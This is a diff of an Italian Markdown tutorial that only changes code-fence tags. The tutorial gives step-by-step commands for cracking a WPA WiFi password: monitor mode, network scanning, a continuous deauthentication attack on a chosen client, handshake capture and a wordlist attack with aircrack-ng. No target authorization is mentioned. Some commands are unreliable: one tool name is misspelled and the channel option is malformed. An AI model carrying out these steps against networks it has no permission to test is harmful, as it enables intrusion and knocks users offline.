@@ -13,21 +13,21 @@ root@kali:~# iwconfig
   <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236414799806484/1.png?ex=65d7a2e1&is=65c52de1&hm=efddbf203bfb5a72ed726fb09f1d7ef179bfdfb0abc165da05397ee78f9615e9&">
 </p>
 Una volta eseguito il comando ci usciranno tutte le schede internet che possediamo sulla macchina. Per iniziare creiamo una scheda parallela virtuale per iniziare il listening delle reti: <br>
-```terminal
+```bash
 root@kali:~# sudo airomon-ng start wlan
 ```
 <p align="center">
   <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236418083815434/2.png?ex=65d7a2e2&is=65c52de2&hm=bc9a2b588cddc145579de3a42ba85e83914b73f1a3f8b34bc8c5afdd0662ee75&">
 </p>
 Successivamente per visualizzare tutte le reti disponibili: <br>
-```terminal
+```bash
 root@kali:~# sudo airodump-ng wlan0mon
 ```
 <p align="center">
   <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236418327089172/4.png?ex=65d7a2e2&is=65c52de2&hm=f3a07c39e30e47b8ff61a4d6462ff30ecdab02777c04ae4f9481e96146d5263f&">
 </p>
 Tra i risultati dobbiamo copiare il BSSID della rete in questione ed eseguire il comando:
-```terminal
+```bash
 root@kali:~# airodump-ng -canale -w NomeFile -d BSSID wlan0mon
 ```
 In questo modo stiamo verificando solo la rete in questione.
@@ -38,7 +38,7 @@ Iniziamo facendo una scansione delle reti, selezioniamo la rete in questione e i
   <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205237572805201940/IMG_20240208_204300.jpg?ex=65d7a3f5&is=65c52ef5&hm=c392c425e720c22d01c86162d3928e617a214758450acf1ded75b676056fdc25&">
 </p>
 Attacco deauth integrato <br>
-```terminal
+```bash
 root@kali:~# sudo aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon
 ```
 <p align="center">
@@ -46,7 +46,7 @@ root@kali:~# sudo aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon
 </p>
 ## WPA handshake decrypt
 Una volta effettuato l'attacco sul terminale linux dovremo trovare un WPA handshake. Se non compare continuiamo l'attacco in modo che il dispositivo si ricolleghi. Una volta trovato il WPA handshake nella cartella locale troveremo dei file "NomeFile" che contengono tutte le informazioni che ci servono sulla rete. Per eseguire la decriptazione della password del wifi necessitiamo di un file che contenga molte password da provare sul file criptato. Per iniziare la decriptazione: <br>
-```terminal
+```bash
 root@kali:~# sudo aircrack-ng NomeFile-01.cap -w Password.txt 
 ```
 <p align="center">
